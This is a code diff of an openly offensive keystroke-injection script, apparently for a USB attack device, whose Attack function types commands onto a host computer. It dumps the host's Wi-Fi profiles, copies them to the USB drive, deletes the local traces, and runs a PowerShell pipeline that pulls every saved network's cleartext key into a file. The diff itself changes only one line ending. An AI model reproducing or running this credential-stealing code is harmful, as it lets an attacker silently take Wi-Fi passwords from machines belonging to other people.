@@ -17,7 +17,7 @@ function Attack() { 		// Initalizes the function Attack that acually exfiltrates
   
   type("netsh wlan show profiles * > wirelessinfo.txt;");										// Gets the WIFI info and stores it in a txt file
   type("copy wirelessinfo.txt $usbpath.name;");													// Copyies wirelesspassword to the USB
-  type("del wirelessinfo.txt\n");																// Delets the copy of wirelessinfo on the host
+  type("del wirelessinfo.txt;");																// Delets the copy of wirelessinfo on the host
   
   type('(netsh wlan show profiles) | Select-String "\\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\\W+\\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ Wifi_Name=$name;Key=$pass }} | Format-Table -AutoSize > wifikeys.txt;');
   																								// The above line gets the keys to the wifi networks
